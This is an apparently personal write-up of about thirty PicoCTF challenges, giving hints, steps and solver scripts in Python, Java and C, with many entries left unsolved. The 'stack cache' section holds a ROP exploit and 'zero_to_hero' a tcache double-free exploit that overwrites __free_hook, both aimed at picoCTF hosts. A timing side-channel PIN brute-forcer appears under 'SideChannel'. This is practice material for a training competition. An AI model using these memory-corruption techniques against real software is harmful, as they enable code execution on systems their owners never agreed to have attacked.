# PicoCTF Write-UP (21 ~ 23 page)
## Sequences
![](https://i.imgur.com/RS16rjB.png)

### Hints
1. Google "matrix diagonalization". Can you figure out how to apply it to this function?

### Solution by steps
1. `wget` the sequences.py and `strings sequences.py` 
2. Realize hoew it works and `vim solve.py`:
```python
import hashlib
import sys

ITERS = int(2e7)
VERIF_KEY = "96cc5f3b460732b442814fd33cf8537c"
ENCRYPTED_FLAG = bytes.fromhex("42cbbce1487b443de1acf4834baed794f4bbd0dfe2d6046e248ff7962b")


def decrypt_flag(sol):
    sol = sol % (10**10000)
    sol = str(sol)
    sol_md5 = hashlib.md5(sol.encode()).hexdigest()

    if sol_md5 != VERIF_KEY:
        print("Incorrect solution")
        sys.exit(1)

    key = hashlib.sha256(sol.encode()).digest()
    flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode()

    print(flag)


def n_seq(n):
    result = ((-20956*(-21)**n) + 2792335*2**(2*n + 3)*(3**n) - (22739409*13**n) + (2279277*17**n))//11639628
    return result

sol = n_seq(ITERS+1)
decrypt_flag(sol)
```
*But the webshell can't run numbers that are to big*

### Useful Stuffs
1. https://ctftime.org/writeup/32913

## SideChannel
![](https://i.imgur.com/tlIZpIp.png)

### Hints
1. Read about "timing-based side-channel attacks."
2. Attempting to reverse-engineer or exploit the binary won't help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
3. Don't run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.

### Solution by steps
1. `wget` all the files and `strings` them
2. `vim find_code.py`: (Don't forget to run it to get your code number)
```python
import time, os
TEST_COUNT = 4 # set this to a lower number for faster results
LEN = 8
CHOICES = "0123456789"

def check(prefix):
  mxtime = -1
  res = ''
  for c in CHOICES:
    cur = prefix+c+'0'*(LEN-len(prefix)-1)
    foo = 0
    for _ in range(TEST_COUNT): # repeat TEST_COUNT times and get the average to improve accuracy
      start = time.time()
      os.system(f"echo '{cur}' | ./pin_checker > /dev/null")
      foo += (time.time()-start)
    avgtime = foo/TEST_COUNT
    if avgtime>mxtime:
      mxtime = avgtime
      res = c
  return res


def main():
  prefix = ''
  for i in range(7):
    c = check(prefix)
    prefix+=c
    print(c)
  # Check the final number(do not hide the results)
  for c in CHOICES:
    cur = prefix+c
    print(f"------ trying {cur} --------")
    os.system(f"echo '{cur}' | ./pin_checker")

main()
```
3. `echo 48390513 | nc saturn.picoctf.net 53932`

### Useful Stuffs
1. https://blog.jettchen.me/posts/sidechannel/

## stack cache
![](https://i.imgur.com/X2alqbO.png)

### Hints
1. Maybe there is content left over from stack?
2. Try compiling it with gcc and clang-12 to see how the binaries differ

### Solution by steps
1. `wget` all the files and `strings vuln.c`
2. `vim solve.py` and run it to get the flag
```python
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "x86"

elf = ELF("./vuln")
rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address

# io = gdb.debug("./vuln", "b *(vuln+56)\nc")
io = remote("saturn.picoctf.net", 57688)
io.sendlineafter(
    b"the flag\n",
    b"a" * 14
    + flat(
        [
            elf.sym["win"],
            # eax will be the address of flag on stack
            # put some ret to prevent flag from being overwritten
            ret,
            ret,
            ret,
            ret,
            ret,
            ret,
            ret,
            ret,
            0x8049EEB,  # mov [esp+4], eax; call printf
            0x80C91F6,  # "%s\n"
        ]
    ),
)
io.interactive()
```

### Useful Stuffs
1. https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/

## Sum-O-Primes
![](https://i.imgur.com/W9TucoJ.png)

### Hints
1. I love squares :)

### Solution by steps
1. `wget` all the files and use `strings` and `cat` to read the contents
2. `vim solve.py` and run it to get the flag
```python
from sympy import * 
import math
from Crypto.Util.number import long_to_bytes
n = "THE_n_NUMBER"
sum = "THE_x_NUMBER"
ct = 'THE_c_NUMBER'
sum = int(sum,16)
n = int(n, 16)
e = 65537
ct = int(ct,16)

a = 1
b = sum
c = n

x = Symbol('x')

p = (int(max(solve(a*x**2 + b*x + c, x)))) * -1
q = (int(min(solve(a*x**2 + b*x + c, x)))) * -1
#print(p)
#print(q)

m = math.lcm(p - 1, q - 1)
d = pow(e, -1, m)
pt = pow(ct, d, n)
print(long_to_bytes(pt))
```

### Useful Stuffs
1. https://github.com/DoomHackCTF/WriteUps/tree/main/picoCTF2022/Crypto/sum-o-primes

## Torrent Analyze
![](https://i.imgur.com/094myGi.png)

### Hints
1. Download and open the file with a packet analyzer like [Wireshark](https://www.wireshark.org/).
2. You may want to enable BitTorrent protocol (BT-DHT, etc.) on Wireshark. Analyze -> Enabled Protocols
3. Try to understand peers, leechers and seeds. [Article](https://www.techworm.net/2017/03/seeds-peers-leechers-torrents-language.html)
4. The file name ends with `.iso`

### Solution by steps
1. Download the file and add `bt-dnt` filter
![](https://i.imgur.com/awJ9YbT.png)
2. Search `e2467cbf021192c241367b892230dc1e05c0580e` in google and grab your flag

### Useful Stuffs
1. https://prfalken.org/index.php/2022/03/29/picoctf-2022-torrent-analyze/

## vault-door-8
![](https://i.imgur.com/TfjSarx.png)

### Useful Stuffs
1. Clean up the source code so that you can read it and understand what is going on.
2. Draw a diagram to illustrate which bits are being switched in the scramble() method, then figure out a sequence of bit switches to undo it. You should be able to reuse the switchBits() method as is.

### Solution by steps
1. `wget` all the files and `strings` it(use [javaviewer](https://codebeautify.org/javaviewer)), copy the `char[] expected` paste it after running `vim solve.java`:
```java
import java.util.*;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.*;
class VaultDoor8Solution {
 public static void main(String args[]) {
  char[] expected = {
      0xF4, 0xC0, 0x97, 0xF0, 0x77, 0x97, 0xC0,
      0xE4, 0xF0, 0x77, 0xA4, 0xD0, 0xC5, 0x77,
      0xF4, 0x86, 0xD0, 0xA5, 0x45, 0x96, 0x27, 0xB5,
      0x77, 0xE0, 0x95, 0xF1, 0xE1, 0xE0, 0xA4, 0xC0,
      0x94, 0xA4
  };
  System.out.println(String.valueOf(unscramble(String.valueOf(expected))));
 }
 static public char[] unscramble(String input) {
  char[] a = input.toCharArray();
  for (int b = 0; b < a.length; b++) {
   char c = a[b];
   c = switchBits(c, 6, 7);
   c = switchBits(c, 2, 5);
   c = switchBits(c, 3, 4);
   c = switchBits(c, 0, 1);
   c = switchBits(c, 4, 7);
   c = switchBits(c, 5, 6);
   c = switchBits(c, 0, 3);
   c = switchBits(c, 1, 2);
   a[b] = c;
  }
  return a;
 }
 
 static public char switchBits(char c, int p1, int p2) {
  char mask1 = (char)(1 << p1);
  char mask2 = (char)(1 << p2);
  char bit1 = (char)(c & mask1);
  char bit2 = (char)(c & mask2);
  char rest = (char)(c & ~(mask1 | mask2));
  char shift = (char)(p2 - p1);
  char result = (char)((bit1 << shift) | (bit2 >> shift) | rest);
  return result;
 }
}
```
2. `javac solve.java` >>> `java VaultDoor8Solution` and get your flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/vault-door-8.md
2. https://codebeautify.org/javaviewer

## droids3
![](https://i.imgur.com/8euiC0b.png)

### Hints
1. Try using apktool and an emulator
2. https://ibotpeaches.github.io/Apktool/
3. https://developer.android.com/studio

### Solution by steps
Still not fix the VM/emulator problem on my device

### Useful Stuffs
1. https://picoctf2019.haydenhousen.com/reverse-engineering/droids3

## Java Script Kiddie 2
![](https://i.imgur.com/1iEYqCm.png)

### Hints
1. This is only a JavaScript problem.

### Solution by steps
Too Hard......

### Useful Stuffs
1. https://ctftime.org/task/9501

## WebNet1
![](https://i.imgur.com/wk7wNUj.png)

### Hints
1. Try using a tool like Wireshark.
2. How can you decrypt the TLS stream?

### Solution by steps
1. `wget` all the stuffs `tshark -r capture.pcap` and look the key file `openssl rsa -in picopico.key -text`
2. `tshark -r capture.pcap  -o "ssl.debug_file:ssldebug.log" -o "ssl.desegment_ssl_records: TRUE" -o "ssl.desegment_ssl_application_data: TRUE" -o "ssl.keys_list:172.31.22.220,443,http,picopico.key" -qz follow,ssl,ascii,0` >>> `mkdir out` >>> `tshark -r capture.pcap  -o "ssl.debug_file:ssldebug.log" -o "ssl.desegment_ssl_records: TRUE" -o "ssl.desegment_ssl_application_data: TRUE" -o "ssl.keys_list:172.31.22.220,443,http,picopico.key" -o "tcp.desegment_tcp_streams: TRUE" -o "tcp.no_subdissector_on_error: FALSE" --export-objects "http,out"`
3. `ls out`, run `strings out/vulture.jpg | grep pico` to get the flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/WebNet1.md

## investigation_encoded_1
![](https://i.imgur.com/tfMNeMF.png)

### Hints
None

### Solution by steps
I'm still thinking how to solve this...

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/investigation_encoded_1.md

## b00tl3gRSA3
![](https://i.imgur.com/8p4AA4O.png)

### Hints
1. There's more prime factors than p and q, finding d is going to be different.

### Solution by steps
1. `nc jupiter.challenges.picoctf.org 51575`
2. Paste n into [Integer factorization calculator](https://www.alpertron.com.ar/ECM.HTM) and press 'Factor' to get the 'Euler's totient'
3. `vim solve.py` and copy the hex value after running it
```python
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    return x % m

c=YOUR_c_VALUE
n=YOUR_n_VALUE
e=65537
phi=YOUR_Eulers_totient_VALUE

d=modinv(e, phi)
m=pow(c, d, n)
print (m)

print(hex(m))
```
4. Psate the value you just copied in [hex-to-ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

### Useful Stuffs
1. https://github.com/HHousen/PicoCTF-2019/tree/24b0981c72638c12f9a8572f81e1abbcf8de306d/Cryptography/b00tl3gRSA3

## Turboflan
![](https://i.imgur.com/V9d4Z2N.png)

### Hints
1. There are a bunch of public writeups on v8 exploitation. Find the relevent ones
2. There likely are many ways to solve this problem.

### Solution by steps
No any idea...

### Useful Stuffs
None

## lockdown-horses
![](https://i.imgur.com/9RqhzTg.png)

### Hints
None

### Solution by steps
Nah... Not having a solution yet

### Useful Stuffs
None

## john_pollard
![](https://i.imgur.com/NEsy786.png)

### Hints
1. The flag is in the format picoCTF{p,q}
2. Try swapping p and q if it does not work

### Solution by steps
`Could not open file or uri for loading certificate from cert.pem`...

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/john_pollard.md

## droids4(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/CftSSOn.png)

### Hints
None

### Solution by steps
Yeah...the VM/emulator problems on my device still exists...

### Useful Stuffs
1. https://www.youtube.com/watch?v=y0Tq2auAc9w&ab_channel=MartinCarlisle

## Forky
![](https://i.imgur.com/hfgFQcD.png)

### Hints
1. What happens when you fork? The flag is picoCTF{IntegerYouFound}. For example, if you found that the last integer passed was 1234, the flag would be picoCTF{1234}

### Solution by steps
1. Download the file and open with Ghidra
```s
undefined4 main(undefined1 param_1)
{
  int *piVar1;
  
  piVar1 = (int *)mmap((void *)0x0,4,3,0x21,-1,0);
  *piVar1 = 1000000000; <<< THE_fIRST_NUM
  fork();
  fork();
  fork();
  fork();
  *piVar1 = *piVar1 + 0x499602d2; <<<THE_SECOND_NUM
  doNothing(*piVar1);
  return 0;
}

void doNothing(undefined4 param_1)
{
  __x86.get_pc_thunk.ax();
  return;
}
```
2. Run `python` and 
```bash
>>> import numpy
>>> base = numpy.int32(1000000000)
>>> step = numpy.int32(0x499602d2)
>>> base + 16*step
__main__:1: RuntimeWarning: overflow encountered in long_scalars
-721750240
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Forky.md

## investigation_encoded_2
![](https://i.imgur.com/kdlDkS5.png)

###  Hints
1. Only use lower case letters and numbers

### Solution by steps
r2 can't work here...

### Useful Stuffs
1. https://picoctf2019.haydenhousen.com/forensics/investigation_encoded_2

## sice_cream(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/kKAUG6E.png)

### Hints
1. Make sure to both files are in the same directory as the executable, and set LD_PRELOAD to the path of libc.so.6

### Solution by steps
No any idea...

### Useful Stuffs
1. https://ctftime.org/writeup/16859

## B1g_Mac
![](https://i.imgur.com/eVRi0St.png)

### Hints
None

### Solution by steps
1. Download the file, extracted it and open it with Ghidra
2. Create a `solve.c`:
```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
    HANDLE hFile;
    char *lpFileName = argv[1]; // "./test/Item01 - Copy.bmp";
    FILETIME creationTime;
    FILETIME lastAccessTime;
    FILETIME lastWriteTime;
    char ch[2];

    hFile = CreateFile(lpFileName,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile failed\n");
        return -1;
    }

    if (!GetFileTime(hFile, &creationTime, &lastAccessTime, &lastWriteTime)) {
        printf("GetFileTime failed\n");
        CloseHandle(hFile);
        return -1;
    }
        CloseHandle(hFile);

    ch[0] = (lastWriteTime.dwLowDateTime & 0xff00) >> 8;
    ch[1] = lastWriteTime.dwLowDateTime & 0xff;
    printf("%c%c", ch[0], ch[1]);

    return 0;
}
```
3. Run it to get your flag

### Useful Stuffs
1. https://tsalvia.hatenablog.com/entry/2019/10/12/053834#B1g_Mac---Points-500

## zero_to_hero
![](https://i.imgur.com/lXjAK96.png)

### Hints
1. Make sure to both files are in the same directory as the executable, and set LD_PRELOAD to the path of libc.so.6

### Solution by steps
1. `wget` all the files and dray the binary one to Ghidra
2. `vim solve.py` (Runit and get the flag)
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --port 49928 zero_to_hero
from pwn import *
import time
import re

# Set up pwntools for the correct architecture
# ELF tutorial: https://github.com/Gallopsled/pwntools-tutorial/blob/master/elf.md
exe = context.binary = ELF('zero_to_hero')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'jupiter.challenges.picoctf.org'
port = int(args.PORT or 29476)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
    
# Standard helper functions
def wait():
    time.sleep(0.15)
def flush():
    return io.recv(4096)

def create(s, l):
    io.sendline('1')
    io.sendline(str(l))
    io.sendline(s)
    wait()

def remove(n):
    io.sendline('2')
    io.sendline(str(n))
    wait()

# win_addr = exe.symbols['win']

io = start()

io.sendlineafter("So, you want to be a hero?", "yes")
wait()

io.recvline()
io.recvline() # receive "Really? Being a hero is hard."
io.recvline() # receive "Fine. I see I can't convince you otherwise."
leak = io.recvline().decode().split('this: ')[1][2:] # get the leaked libc system address
SYSTEM = int(leak, 16)
LIBC_BASE = SYSTEM - 0x2C550
log.info("Leaked Libc: {}".format(hex(LIBC_BASE)))

MALLOC_HOOK = LIBC_BASE + 0x72380
# at 0x1e3ef8 in file
FREE_HOOK = LIBC_BASE + 0x1C0B28

log.info("`malloc` chunk A, size 0x30")
create("AAAA", 40)
log.info("`malloc` chunk B, size 0x110")
create("BBBB", 264)

log.info("`free` chunk B")
remove(1)

log.info("`free` chunk A, so we can write to it and overflow it next")
remove(0)
log.info("`malloc` (for the second time) chunk A, size 0x30; overwrite size of chunk B with null byte")
create("a"*40, 40)

log.info("`free` chunk B again (double `free` conditions met)")
remove(1)

io.recv(4096)

# Overwrite the forward address of chunk B with the address of `FREE_HOOK`
# by allocating and removing it from the 0x100 tcache list
log.info("`malloc` chunk of size 0x100 and overwrite the forward address to `__free_hook`")
create(p64(FREE_HOOK), 248)

# The above step removed chunk B from the 0x100 list, so we cannot free it
# again from that list to access our overwritten forward pointer. However, since we
# double-freed block B, it still exists in the 0x110 list. We create a chunk of the
# same size as chunk B, thus returning to us chunk B from tcache. Now the head pointer
# (which always points to the first block) of the 0x110 list points to the forward 
# address of block B, which we overwrote to `__free_hook`. The block in the 0x100 list
# refers to the same memory location as the block in the 0x110 list.
log.info("`malloc` the same (as above) chunk but from the list for size 0x110, thus removing it from the list and leaving the next chunk pointer pointing at `__free_hook`")
create("0", 264)

# Now that the next block points to our overwritten memory location, we `malloc` it.
# `malloc` sees our request for a block of memory with size 0x110 and returns the pointer
# to the next block, which we overwrote to `FREE_HOOK`. `malloc` then asks what value we
# want to store in this "block of memory" (which is actually `FREE_HOOK`). We tell is to
# store the address of `win()`. We have successfully written over an address of our choosing
# with an arbitrary address. `malloc` believes we simply asked for a block of memory, it gave
# us one, and then we stored our data in it. You can think of this as `malloc` being oblivious
# to our attack.
log.info("Use `malloc` to write the address of `win()` to `__free_hook`")
# 0x400a02 is the location of win()
create(p64(0x400a02), 264)

# We overwrote the `__free_hook` pointer to the `win()` function. So, now we actually have to
# use our overwritten memory by calling `free()`, which redirects its actions to whatever
# function `__free_hook` happens to point to.
log.info("Execute the `win()` function at 0x400a02")
remove(0)

# io.recvuntil("\n") # remove the newline from the flag
output = io.recvuntil("}")
flag = re.search("picoCTF{.*?}", output.decode("ascii")).group()
log.success(flag)

# io.interactive()
```

### Useful Stuffs
1. https://picoctf2019.haydenhousen.com/binary-exploitation/zero_to_hero

## Clouds(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/esWluF0.png)

### Hints
1. Have you heard of differential cryptanalysis?

### Solution by steps
No any idea...

### Useful Stuffs
None

## Bizz Fuzz(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/ijQfQJa.png)

### Hints
1. What functions are imported? Where are they used? And what do these strings mean?
2. Woah, some of these functions seem similar, can you figure them out one group at a time?
3. If fancy new dissassemblers take too long, there's always objdump!
4. Have you heard of binary instrumentation before? It might keep you from running in circles. No promises.
5. ANGR is another great framework.

### Solution by steps
Can't enable r2 in webshell...

### Useful Stuffs
1. https://activities.tjhsst.edu/csc/writeups/picoctf-2021-bizz-fuzz

## Bithug(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/42Bpel7.png)

### Hints
1. Every user gets their own target repository to attack called _/.git, but no permission to read it

### Solution by steps
Can't realize how the webpage works...

### Useful Stuffs
1. https://docs.abbasmj.com/ctf-writeups/picoctf2021#bithug

## corrupt-key-2(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/F7bKCC3.png)

### Hints
None

### Solution by steps
No any idea... 

### Useful Stuffs
None

## vr-school(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/6CVcpuz.png)

### Hints
None

### Solution by steps
`Bad system call (core dumped)`......

### Useful Stuffs
None

## MATRIX(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/7PI95yo.png)

### Hints
None

### Solution by steps
...Still don't know how it works...

### Useful Stuffs
None

## Live Art(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/Pk4VyuQ.png)

### Hints
1. The flag will be the admin's username/broadcast link, at the origin http://localhost:4000/
2. https://html.spec.whatwg.org/multipage/custom-elements.html

### Solution by steps
Too hard...

### Useful Stuffs
None

## NSA Backdoor
![](https://i.imgur.com/gZgjyWG.png)

### Hints
1. Look for Mr. Wong's whitepaper... His work has helped so many cats!

### Solution by steps
1. `wget` all the files and `cat output.txt`
2. `vim find.py`:
```python
# Python code for Pollard p-1 Factorization Method
# Based on https://github.com/Ganapati/RsaCtfTool/blob/c13713a2808a03b15eb62e35605b9eb4271069cc/attacks/single_key/pollard_p_1.py

import binascii
import gmpy2
import math
from tqdm import tqdm


def _primes_yield_gmpy(n):
    p = i = 1
    while i <= n:
        p = gmpy2.next_prime(p)
        yield p
        i += 1


def primes(n):
    return list(_primes_yield_gmpy(n))


def pollard_P_1(n, progress=True, num_primes=2000):
    """Pollard P1 implementation"""
    z = []
    logn = math.log(int(gmpy2.isqrt(n)))
    prime = primes(num_primes)

    for j in range(0, len(prime)):
        primej = prime[j]
        logp = math.log(primej)
        for i in range(1, int(logn / logp) + 1):
            z.append(primej)
    try:
        for pp in tqdm(prime, disable=(not progress)):
            i = 0
            x = pp
            while 1:
                x = gmpy2.powmod(x, z[i], n)
                i = i + 1
                y = gmpy2.gcd(n, x - 1)
                if y != 1:
                    p = y
                    q = n // y
                    return p, q
                if i >= len(z):
                    return 0, None
    except TypeError:
        return 0, None


e = 3
c = 0xYOUR_c_NUMBER
n = 0xYOUR_n_NUMBER
num_primes = 20_000

p, q = pollard_P_1(n, num_primes=num_primes)

print(f"p: {p:x}")
print(f"q: {q:x}")
if q is None:
    print("Pollard p-1 Factorization Attack Failed. You can try increasing `num_primes`...")
```
3. Copy the output and paste them on [SageMathCell](https://sagecell.sagemath.org/)
![](https://i.imgur.com/ulZn0yN.png)
4. Grab one of the output and paste it to [Hex-to-Text](https://www.rapidtables.com/convert/number/hex-to-ascii.html) and get your flag

### Useful Stuffs
1. https://sagecell.sagemath.org/
2. https://www.rapidtables.com/convert/number/hex-to-ascii.html
3. https://www.youtube.com/watch?v=pARmkuMg5tk&ab_channel=MartinCarlisle
4. https://github.com/HHousen/PicoCTF-2022/blob/master/Cryptography/NSA%20Backdoor/factor.py

## solfire(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/A4dg4I6.png)

### Hints
None

### Solution by steps
Don't know where to start...

### Useful Stuffs
None

## Wizardlike(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/xfj1MSS.png)

### Hints
1. Different tools are better at different things. Ghidra is awesome at static analysis, but radare2 is amazing at debugging.
2. With the right focus and preparation, you can teleport to anywhere on the map.

### Solution by steps
Webshell keeps lost connection ......

### Useful Stuffs
1. https://github.com/elemental-unicorn/picoctf-2022/tree/master/reverse_eng/wizard-like



